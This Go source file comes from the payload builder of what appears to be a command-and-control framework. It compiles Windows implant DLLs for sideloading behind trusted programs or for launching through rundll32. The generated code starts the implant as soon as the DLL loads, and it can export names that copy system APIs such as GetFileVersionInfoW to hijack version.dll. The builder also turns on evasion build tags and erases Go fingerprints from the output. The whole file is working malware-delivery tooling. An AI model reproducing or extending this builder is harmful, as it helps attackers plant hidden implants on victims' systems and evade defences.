package builder

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"

	"toshell/internal/server/logging"
)

// ─── DLL 载荷（白加黑 DLL 侧加载 / rundll32 直接加载）─────────────────────
//
// 为什么单独一个文件：`format=dll` 在 v1.3.5 及以前**实际上是坏的** ——
// compileLibrary 用普通 `go build`（CGO_ENABLED=0）编译，而生成胶水里 `import "C"`
// 的文件在 CGO_ENABLED=0 下会被 Go 静默跳过，于是产物是一个"改了扩展名的 EXE"：
// 没有 IMAGE_FILE_DLL 标志、没有导出表，既不能被宿主侧加载，也不能被 rundll32 调用
// （实测：characteristics=0x222、导出目录 RVA=0）。而生成载荷页给出的"白加黑/rundll32"
// 加载器链恰恰依赖一个真正的 DLL。
//
// 本文件把它做成真 DLL：
//   - `go build -buildmode=c-shared` + `CGO_ENABLED=1` + mingw-w64 gcc（**必须与目标架构一致**，
//     x64 需要 x86_64-w64-mingw32-gcc，否则产物架构不对、宿主加载会失败）；
//   - 生成的胶水在 **DLL 加载时**（Go 的 init 在 c-shared 下会执行）就 `go startImplant()`
//     —— 白加黑场景宿主不一定调用我们的导出函数，"加载即启动"才是最省事的用法；
//   - 同时按操作员指定的名字导出一个函数，供 `rundll32 payload.dll,<名字>` 直接调用；
//   - 启动逻辑与 exe 完全一致（同一个 `startImplant()`），且第一件事就是启动随机延迟的休眠，
//     不会在 DLL 加载的 loader lock 里做联网/建线程等重活。

// defaultDLLExport 默认导出名：`rundll32 payload.dll,Start` 就能起。
const defaultDLLExport = "Start"

// dllExportRe 导出名白名单（与 cgo //export 的要求一致：合法 C 标识符）。
var dllExportRe = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]{0,63}$`)

// ValidateDLLExport 校验/归一化 DLL 导出名（空 = 用默认 Start）。
func ValidateDLLExport(name string) (string, error) {
	name = strings.TrimSpace(name)
	if name == "" {
		return defaultDLLExport, nil
	}
	if !dllExportRe.MatchString(name) {
		return "", fmt.Errorf("DLL 导出名 %q 不合法：只能是字母/数字/下划线、以字母或下划线开头，最多 64 字符（例如 Start / GetFileVersionInfoW）", name)
	}
	return name, nil
}

// generateDLLGlue 生成 c-shared 胶水文件（lib.go）：
//
//	init()          → DLL 加载即启动（白加黑）
//	<exportName>    → rundll32 / 宿主可调用的导出函数（C 侧 __stdcall 包装，见下）
//	main()          → c-shared 需要 main 包，留空即可
//
// 导出名为什么绕一层 C：白加黑需要的导出名常常是**系统 API 的名字**
// （例如 version.dll 的 GetFileVersionInfoW）。如果直接用 `//export GetFileVersionInfoW`，
// cgo 会把它和 windows.h 里的同名声明撞在一起而编译失败。改成"C 侧定义一个同名
// __stdcall 包装 → 调 Go 侧的固定名 tshEntry"就绕开了冲突，还顺带修正了 386 上
// rundll32 需要的 stdcall 调用约定（x64 只有一种约定，__stdcall 被忽略）。
func generateDLLGlue(exportName string, autoStart bool) string {
	var b strings.Builder
	b.WriteString(`// 由服务端生成（internal/server/builder/dll.go）—— 不要手工修改。
//
//go:build shared

package main

/*
#include <stdint.h>

// 只放**声明**：cgo 会把 preamble 同时编进两个目标文件，这里写函数定义会导致
// "multiple definition of ...@16"（实测）。真正的定义在 dllentry.c 里（同目录，
// cgo 会单独编译一次）。
extern void tshEntry(void);
*/
import "C"

import (
	"sync"
)

// 只启动一次：白加黑可能是"加载即启动"，也可能宿主随后调用导出函数，两个入口都要防重。
var implantOnce sync.Once

// startOnce 起一个独立线程跑植入端主流程（不在调用线程/loader lock 里做重活：
// startImplant 第一步就是启动随机延迟的休眠）。
func startOnce() {
	implantOnce.Do(func() {
		go startImplant()
	})
}

//export tshEntry
func tshEntry() {
	startOnce()
}

`)
	if autoStart {
		b.WriteString(`// init 在 DLL 被加载时由 Go runtime 调用（c-shared）：白加黑场景宿主不一定会调用
// 我们的导出函数，所以默认"加载即启动"。需要宿主自己控制时机时，在生成载荷页取消勾选
// 「DLL 加载即启动」（构建时会去掉 autostart 这个标签）。
func init() {
	startOnce()
}

`)
	}
	b.WriteString("func main() {}\n")
	return b.String()
}

// generateDLLEntryC 生成导出函数的 C 定义（单独 .c 文件，避免 cgo preamble 的重复定义）。
//
// 为什么绕一层 C 而不是 `//export <导出名>`：
//   - 白加黑需要的导出名常常就是系统 API 的名字（如 version.dll 的 GetFileVersionInfoW），
//     直接 //export 会和 windows.h 的同名声明冲突而编译失败；
//   - C 侧显式 __stdcall 顺带修正了 386 上 rundll32 需要的调用约定（x64 只有一种约定，
//     __stdcall 被忽略）。
func generateDLLEntryC(exportName string) string {
	return fmt.Sprintf(`/* 由服务端生成（internal/server/builder/dll.go）—— 不要手工修改。 */
#include <stdint.h>

extern void tshEntry(void);

__declspec(dllexport) void __stdcall %s(void* hwnd, void* hinst, char* cmdline, int showCmd) {
	(void)hwnd; (void)hinst; (void)cmdline; (void)showCmd;
	tshEntry();
}
`, exportName)
}

// sharedGCC 解析 DLL 构建需要的 mingw gcc：**必须是架构匹配的那个**
// （c-shared 走 C 工具链，用错架构会产出无法被宿主加载的 DLL，宁可明确报错）。
func sharedGCC(arch string) (string, error) {
	key := normalizeArch(arch)
	best, mismatched, probed := scanGCC(key)
	if best != nil {
		return best.Path, nil
	}
	if len(mismatched) > 0 {
		return "", fmt.Errorf("DLL 载荷需要与目标架构一致的 mingw-w64 gcc：请求 %s，但本机只有 %s（%s）。"+
			"x64 DLL 请安装 x86_64-w64-mingw32-gcc（MSYS2: pacman -S mingw-w64-x86_64-gcc），"+
			"或在 `builder.mingw_gcc_path` 里指定正确的编译器路径", key, mismatched[0].Triple, mismatched[0].Path)
	}
	return "", fmt.Errorf("%s\n（若不想装 gcc，可改用 `format=exe` 或 `format=shellcode`：前者是普通可执行文件，后者可由内存加载链使用）", gccNotFoundMessage(probed))
}

// compileSharedLibrary 用 c-shared 编译真正的 Windows DLL。
// tags 里会带上 shared（排除 entry_exec.go 的 main）、autostart（生成加载即启动的 init）
// 以及通道/档案/免杀等相关标签。
func (b *Builder) compileSharedLibrary(tmpDir, targetOS, arch string, opts BuildOptions, exportName string, autoStart bool) ([]byte, error) {
	if targetOS != "windows" {
		return nil, fmt.Errorf("DLL 载荷目前只支持 Windows（当前目标：%s）", targetOS)
	}
	gccPath, err := sharedGCC(arch)
	if err != nil {
		return nil, err
	}

	glue := generateDLLGlue(exportName, autoStart)
	if err := os.WriteFile(filepath.Join(tmpDir, "lib.go"), []byte(glue), 0644); err != nil {
		return nil, err
	}
	// 导出函数的 C 定义单独一个文件（放 cgo preamble 里会重复定义）
	if err := os.WriteFile(filepath.Join(tmpDir, "dllentry.c"), []byte(generateDLLEntryC(exportName)), 0644); err != nil {
		return nil, err
	}

	// 标签：shared + autostart（可选）+ 通道/档案/免杀
	tags := []string{"shared"}
	if autoStart {
		tags = append(tags, "autostart")
	}
	transport := opts.Transport
	if transport == "" {
		transport = transportForProtocol(opts.Protocol)
	}
	if extra := buildTagList(transport, opts.Profile, opts.EvasionScan, opts.BofEnabled, opts.ExecModule); extra != "" {
		tags = append(tags, strings.Fields(extra)...)
	}
	tagArg := strings.Join(tags, " ")

	outPath := filepath.Join(tmpDir, "implant.dll")
	ldflags := "-s -w -buildid="
	if normalizeArch(arch) == "386" {
		// 386 上 __stdcall 会把导出名修饰成 Name@16，而 rundll32 是按字面名查找导出
		// （不会自动补 @16）。mingw ld 的 --kill-at 用来剥掉这个修饰，让导出名就是 Name。
		ldflags += " -extldflags=-Wl,--kill-at"
	}
	args := []string{"build", "-trimpath", "-buildmode=c-shared", "-tags", tagArg,
		"-ldflags", ldflags, "-o", outPath, "."}

	cmd := exec.Command("go", args...)
	cmd.Dir = tmpDir
	cmd.Env = append(os.Environ(),
		"GOOS=windows", "GOARCH="+normalizeArch(arch),
		"CGO_ENABLED=1", "CC="+gccPath,
		// 与普通载荷一致：Windows 用 go1.20 工具链（Win7/2008R2 兼容）
		"GOTOOLCHAIN=go1.20.14",
	)
	logging.Info("builder", "compiling DLL: arch=%s tags=%q gcc=%s export=%s autostart=%v",
		normalizeArch(arch), tagArg, gccPath, exportName, autoStart)

	if out, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("DLL 构建失败（c-shared + mingw）：%v\n输出：%s", err, trimOutput(out))
	}

	bin, err := os.ReadFile(outPath)
	if err != nil {
		return nil, fmt.Errorf("读取 DLL 产物失败：%v", err)
	}
	// 指纹擦除（与 exe 路径一致）
	if scrubbed, removed := ScrubGoFingerprint(bin); len(removed) > 0 {
		bin = scrubbed
		logging.Info("builder", "go fingerprint scrubbed (dll): %s", strings.Join(removed, "；"))
	}
	return bin, nil
}

// DLLStatus 供 /builders 能力接口与前端展示：本机能不能构建 DLL、用哪个 gcc。
func DLLStatus(arch string) (bool, string) {
	if runtime.GOOS != "windows" {
		// 交叉编译 c-shared 需要目标平台的 C 工具链，服务端在 Linux/macOS 上通常没有 mingw
		if p, err := exec.LookPath("x86_64-w64-mingw32-gcc"); err == nil {
			return true, "可用：" + p
		}
		return false, "DLL 载荷需要 mingw-w64 gcc（Linux 上可 apt install gcc-mingw-w64-x86-64）"
	}
	gcc, err := sharedGCC(arch)
	if err != nil {
		return false, err.Error()
	}
	return true, "可用：" + gcc
}
